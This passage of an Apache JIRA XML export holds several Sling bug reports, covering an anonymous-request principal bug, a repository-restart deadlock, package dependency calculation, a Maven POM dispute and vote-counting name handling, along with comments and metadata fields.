                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1h9oo:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11825] SlingHttpServletRequestImpl.getUserPrincipal() does not return null for anonymous requests</title>
                <link>https://issues.apache.org/jira/browse/SLING-11825</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;According to &lt;a href=&quot;https://docs.oracle.com/javaee/6/api/javax/servlet/http/HttpServletRequest.html#getUserPrincipal(&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://docs.oracle.com/javaee/6/api/javax/servlet/http/HttpServletRequest.html#getUserPrincipal(&lt;/a&gt;) the method &lt;tt&gt;getUserPrincipal&lt;/tt&gt; is supposed to return&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;null if the user has not been authenticated&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Unfortunately the implementation in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-engine/blob/c31e3ad64cafa0e53f67ad7551b13dc7124ccff6/src/main/java/org/apache/sling/engine/impl/SlingHttpServletRequestImpl.java#L320&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-engine/blob/c31e3ad64cafa0e53f67ad7551b13dc7124ccff6/src/main/java/org/apache/sling/engine/impl/SlingHttpServletRequestImpl.java#L320&lt;/a&gt; seems to violate this contract, as I always get back a non-null value (even if the user was never authenticated).&lt;/p&gt;

&lt;p&gt;The &lt;tt&gt;ResourceResolver.adaptTo(Principal.class)&lt;/tt&gt; will always return a non-null value due to &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-jcr-resource/blob/685c50921085941f4cbb1a3ccdbf90bad0605527/src/main/java/org/apache/sling/jcr/resource/internal/helper/jcr/JcrResourceProvider.java#L617&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-jcr-resource/blob/685c50921085941f4cbb1a3ccdbf90bad0605527/src/main/java/org/apache/sling/jcr/resource/internal/helper/jcr/JcrResourceProvider.java#L617&lt;/a&gt;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13532313">SLING-11825</key>
            <summary>SlingHttpServletRequestImpl.getUserPrincipal() does not return null for anonymous requests</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="kwin">Konrad Windszus</assignee>
                                    <reporter username="kwin">Konrad Windszus</reporter>
                        <labels>
                    </labels>
                <created>Wed, 12 Apr 2023 09:47:19 +0000</created>
                <updated>Thu, 20 Jul 2023 10:17:22 +0000</updated>
                            <resolved>Fri, 14 Apr 2023 07:52:00 +0000</resolved>
                                    <version>Engine 2.14.0</version>
                                    <fixVersion>Engine 2.15.0</fixVersion>
                                    <component>Engine</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17711279" author="kwin" created="Wed, 12 Apr 2023 09:55:54 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=angela&quot; class=&quot;user-hover&quot; rel=&quot;angela&quot;&gt;angela&lt;/a&gt; Can you have a look?&lt;/p&gt;</comment>
                            <comment id="17712241" author="kwin" created="Fri, 14 Apr 2023 07:52:00 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-engine/commit/35e0fb2c8679bbc10e64f4219c98a483ac0824e6&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-engine/commit/35e0fb2c8679bbc10e64f4219c98a483ac0824e6&lt;/a&gt;.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310050">
                    <name>Regression</name>
                                            <outwardlinks description="breaks">
                                        <issuelink>
            <issuekey id="13544268">SLING-11974</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 27 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1h8f4:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11824] Deadlock during repository restart</title>
                <link>https://issues.apache.org/jira/browse/SLING-11824</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;A deadlock can occur when the repository is restarted in a running system. This may be due to a configuration change of a low level component, but has also been reported to occur after refreshing the commons-io bundle.&lt;/p&gt;

&lt;p&gt;From the thread dump&lt;/p&gt;
&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;&quot;VM Thread&quot; os_prio=0 cpu=106005.20ms elapsed=72363.91s tid=0x000056165220f800 nid=0x19ef runnable  
&quot;ParGC Thread#0&quot; os_prio=0 cpu=11616.68ms elapsed=72363.93s tid=0x00005616520cb800 nid=0x19ee runnable  
&quot;ParGC Thread#1&quot; os_prio=0 cpu=11624.23ms elapsed=72362.83s tid=0x00005616534fd800 nid=0x19f8 runnable  
&quot;ParGC Thread#2&quot; os_prio=0 cpu=11621.66ms elapsed=72362.83s tid=0x0000561653518000 nid=0x19f9 runnable  
&quot;VM Periodic Task Thread&quot; os_prio=0 cpu=32588.40ms elapsed=72360.26s tid=0x0000561655593800 nid=0x1a13 waiting on condition  
JNI global refs: 98, weak refs: 3
Found one Java-level deadlock:
=============================
&quot;CM Event Dispatcher (Fire ConfigurationEvent: pid=org.apache.sling.jcr.resource.internal.JcrResourceResolverFactoryImpl)&quot;:
  waiting to lock monitor 0x000056166302ce80 (object 0x00000007679e6638, a org.apache.sling.engine.impl.helper.SlingServletContext),
  which is held by &quot;SlingServletContext registration&quot;
&quot;SlingServletContext registration&quot;:
  waiting to lock monitor 0x00005616631e3480 (object 0x000000074f987900, a java.util.HashMap),
  which is held by &quot;CM Event Dispatcher (Fire ConfigurationEvent: pid=org.apache.sling.jcr.resource.internal.JcrResourceResolverFactoryImpl) &lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13532209">SLING-11824</key>
            <summary>Deadlock during repository restart</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cziegeler">Carsten Ziegeler</assignee>
                                    <reporter username="jsedding">Julian Sedding</reporter>
                        <labels>
                    </labels>
                <created>Tue, 11 Apr 2023 15:50:21 +0000</created>
                <updated>Fri, 26 May 2023 07:31:31 +0000</updated>
                            <resolved>Wed, 12 Apr 2023 05:35:55 +0000</resolved>
                                    <version>Engine 2.14.0</version>
                                    <fixVersion>Engine 2.15.0</fixVersion>
                                    <component>Engine</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17711039" author="cziegeler" created="Tue, 11 Apr 2023 16:00:28 +0000"  >&lt;p&gt;I think this is due to the synchronous service unregistration in SlingServletContext#contextDestroyed .&#160; I can&apos;t reproduce the issue with this PR: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-engine/pull/32&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-engine/pull/32&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 28 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1h7s8:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11821] CP Converter doesn&apos;t handle Container packages correctly for calculating dependencies</title>
                <link>https://issues.apache.org/jira/browse/SLING-11821</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The implementation of &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-8396&quot; title=&quot;Sling Content Package to Feature Model fails with embedded Bundles&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-8396&quot;&gt;&lt;del&gt;SLING-8396&lt;/del&gt;&lt;/a&gt; doesn&apos;t handle lookup of packagetype correctly making container packages not being detected correctly for the dependency calculation which can lead to missing dependencies at runtime (as container packages are stripped out later)&lt;/p&gt;</description>
                <environment></environment>
        <key id="13531591">SLING-11821</key>
            <summary>CP Converter doesn&apos;t handle Container packages correctly for calculating dependencies</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="dsuess">Dominik S&#252;&#223;</assignee>
                                    <reporter username="dsuess">Dominik S&#252;&#223;</reporter>
                        <labels>
                    </labels>
                <created>Wed, 5 Apr 2023 13:58:44 +0000</created>
                <updated>Mon, 8 May 2023 12:21:34 +0000</updated>
                            <resolved>Wed, 5 Apr 2023 14:10:35 +0000</resolved>
                                    <version>Content-Package to Feature Model Converter 1.3.0</version>
                                    <fixVersion>Content-Package to Feature Model Converter 1.3.2</fixVersion>
                                    <component>Content-Package to Feature Model Converter</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17708920" author="dsuess" created="Wed, 5 Apr 2023 14:02:34 +0000"  >&lt;p&gt;PR created at &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/pull/162&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/pull/162&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17708926" author="rombert" created="Wed, 5 Apr 2023 14:10:35 +0000"  >&lt;p&gt;PR applied, thanks for the contribution &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=dsuess&quot; class=&quot;user-hover&quot; rel=&quot;dsuess&quot;&gt;dsuess&lt;/a&gt;!&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310560">
                    <name>Problem/Incident</name>
                                                                <inwardlinks description="is caused by">
                                        <issuelink>
            <issuekey id="13231612">SLING-8396</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 29 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1h3zc:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11818] Update to Sling Parent POM 48 broke api generation</title>
                <link>https://issues.apache.org/jira/browse/SLING-11818</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;This commit &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-jcr-base/commit/97ea7f527040b1bcb0f7f9888a4c599ca91f58cb&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-jcr-base/commit/97ea7f527040b1bcb0f7f9888a4c599ca91f58cb&lt;/a&gt; added a buggy dependency management section to the pom without any versions. This confuses other tools like the slingfeature maven plugin.&lt;/p&gt;

&lt;p&gt;The whole dependency management section is not needed and can simply be removed&lt;/p&gt;</description>
                <environment></environment>
        <key id="13531431">SLING-11818</key>
            <summary>Update to Sling Parent POM 48 broke api generation</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cziegeler">Carsten Ziegeler</assignee>
                                    <reporter username="cziegeler">Carsten Ziegeler</reporter>
                        <labels>
                    </labels>
                <created>Tue, 4 Apr 2023 11:19:05 +0000</created>
                <updated>Wed, 5 Apr 2023 08:40:33 +0000</updated>
                            <resolved>Tue, 4 Apr 2023 11:31:52 +0000</resolved>
                                    <version>JCR Base 3.1.12</version>
                                    <fixVersion>JCR Base 3.1.14</fixVersion>
                                    <component>JCR</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17708383" author="cziegeler" created="Tue, 4 Apr 2023 11:31:52 +0000"  >&lt;p&gt;Removed the buggy section in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-jcr-base/commit/624329c233a9bc4f090073195cbfbaf6e52a7234&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-jcr-base/commit/624329c233a9bc4f090073195cbfbaf6e52a7234&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17708390" author="kwin" created="Tue, 4 Apr 2023 11:52:43 +0000"  >&lt;p&gt;Dependency Management is merged with the one from the parent (from which it got the versions). It was deliberately added to always set the scope to test for those dependencies. If you remove those all dependent modules will transitively get the legacy OSGi dependency. Also I would really appreciate a PR for changes like this.&lt;/p&gt;</comment>
                            <comment id="17708391" author="cziegeler" created="Tue, 4 Apr 2023 11:53:54 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt; First of all these dependencies are not used in the pom at all; second as I wrote it broke tooling - and it is ironic that you ask for a PR where your change which broke it was done without a PR&lt;/p&gt;</comment>
                            <comment id="17708413" author="kwin" created="Tue, 4 Apr 2023 12:56:56 +0000"  >&lt;blockquote&gt;&lt;p&gt;First of all these dependencies are not used in the pom at all&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Both &lt;tt&gt;osgi.core&lt;/tt&gt; and &lt;tt&gt;osgi.cmpn&lt;/tt&gt; are transitive dependencies of &lt;tt&gt;org.apache.sling.testing.osgi-mock&lt;/tt&gt;. If you don&apos;t manage the scope those will end up in the compile classpath. Just look at the effective pom or the output of &lt;tt&gt;mvn dependency:build-classpath -DincludeScope=compile&lt;/tt&gt;. Without the dependency management to explicitly manage the scope of those, the compile classpath is unnecessarily big.&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;second as I wrote it broke tooling -&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;You initially wrote &quot;buggy dependency management section&quot; which I disagree with. Seems that the tooling you are referring to just cannot properly calculate the effective pom. That needs to be fixed. Can you describe in a dedicated JIRA issue what exactly the problem was?&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;it is ironic that you ask for a PR where your change which broke it was done without a PR&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Yes, you are right, my changes should also have been introduced through a PR. But they didn&apos;t revert any changes, while yours did. In any case the code quality benefits from PRs so let&apos;s do that even more often in the future.&lt;/p&gt;

</comment>
                            <comment id="17708421" author="cziegeler" created="Tue, 4 Apr 2023 13:17:06 +0000"  >&lt;p&gt;It seems the problem is really the mock project - so if we want to fix this, those dependencies there should be changed to be not provided.&lt;/p&gt;
&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;[INFO] +- org.apache.sling:org.apache.sling.testing.osgi-mock:jar:2.3.2:test
[INFO] | &#160;+- org.osgi:osgi.core:jar:7.0.0:provided
[INFO] | &#160;+- org.osgi:osgi.cmpn:jar:7.0.0:provided
[INFO] | &#160;+- org.apache.commons:commons-lang3:jar:3.0.1:test
[INFO] | &#160;\- org.reflections:reflections:jar:0.9.9:test
[INFO] | &#160; &#160; +- org.javassist:javassist:jar:3.18.2-GA:test
[INFO] | &#160; &#160; \- com.google.code.findbugs:annotations:jar:2.0.1:test&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</comment>
                            <comment id="17708422" author="kwin" created="Tue, 4 Apr 2023 13:20:30 +0000"  >&lt;p&gt;This is already done in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-testing-osgi-mock/commit/38b629f4531eca18c6ec3428ac693c9bdcd98888&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-testing-osgi-mock/commit/38b629f4531eca18c6ec3428ac693c9bdcd98888&lt;/a&gt; but only released in 3.0.0 and newer.&lt;/p&gt;</comment>
                            <comment id="17708436" author="cziegeler" created="Tue, 4 Apr 2023 13:58:56 +0000"  >&lt;p&gt;that&apos;s what we should do then, see &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11819&quot; title=&quot;Update to latest Sling mock dependencies&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11819&quot;&gt;&lt;del&gt;SLING-11819&lt;/del&gt;&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 29 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1h2zs:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11816] Transliterated project member names break the vote counting algorithm</title>
                <link>https://issues.apache.org/jira/browse/SLING-11816</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;If a project member provides their name using transliterated forms between Whimsy and their email address, the CLI tool won&apos;t be able to correctly record their names when it comes to counting the votes in a release tally email.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13531002">SLING-11816</key>
            <summary>Transliterated project member names break the vote counting algorithm</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="radu">Radu Cotescu</assignee>
                                    <reporter username="radu">Radu Cotescu</reporter>
                        <labels>
                    </labels>
                <created>Fri, 31 Mar 2023 16:44:17 +0000</created>
                <updated>Mon, 3 Apr 2023 10:43:44 +0000</updated>
                            <resolved>Mon, 3 Apr 2023 10:43:44 +0000</resolved>
                                                    <fixVersion>Committer CLI 1.0.0</fixVersion>
                                    <component>Tooling</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                        <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 29 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
